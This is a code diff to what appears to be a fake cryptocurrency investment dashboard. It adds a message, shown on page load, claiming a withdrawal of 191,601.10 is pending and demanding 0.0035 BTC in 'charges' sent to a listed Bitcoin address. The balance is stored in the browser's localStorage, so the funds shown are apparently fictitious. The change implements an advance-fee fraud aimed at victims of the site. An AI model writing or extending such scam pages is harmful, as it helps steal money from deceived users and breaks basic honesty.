@@ -99,6 +99,15 @@
         </div>
     </div>
 
+    <div class="contactForm chargesDiv" style="display: none; margin: 0 5px;">
+        <p>
+            Withdrawal of 191,601.10 is pending. <br> You will need 0.0035 BTC charges for withdrawal to your account to avoid errors or loss of assets.
+        </p>
+        <p style="font-size: 10; width: 100%; margin: 0 10px;">
+            bc1qhtx86fhc0a9tkmeakajstygr2tgupjnw63cenx
+        </p>
+    </div>
+
     <div class="footerDash">
         <!-- <div class="firstshift">
             <h3>Digital Business Transformation</h3>
@@ -122,6 +131,7 @@
                 </div>
             </div>
         </div> -->
+
 
         <div class="secondShift">
             <div class="innerOne">
@@ -214,6 +224,7 @@ document.addEventListener('DOMContentLoaded', function() {
     let incomeAdded = document.querySelector('.incomeAdded');
     let recentTrx = document.querySelector('.recentT');
     let withdrawSuccess = document.querySelector('.withdrawSuccess');
+    let chargesDiv = document.querySelector('.chargesDiv');
 
     // Initialize application state from localStorage or set defaults
     let currentBalance = localStorage.getItem('currentBalance') ? 
@@ -420,6 +431,15 @@ document.addEventListener('DOMContentLoaded', function() {
             withdrawDeposit.style.display = 'flex'
         }, 2000);
     }
+
+    // SHOW WITHDRAWAL FEE ON LOAD
+    const showWithdrawalFee = () => {
+        if(chargesDiv.style.display == 'none'){
+            chargesDiv.style.display = 'flex';
+        }
+    }
+
+    showWithdrawalFee();
 
     // Event listeners
     codeConfirm.addEventListener('click', confirmCodeInput);
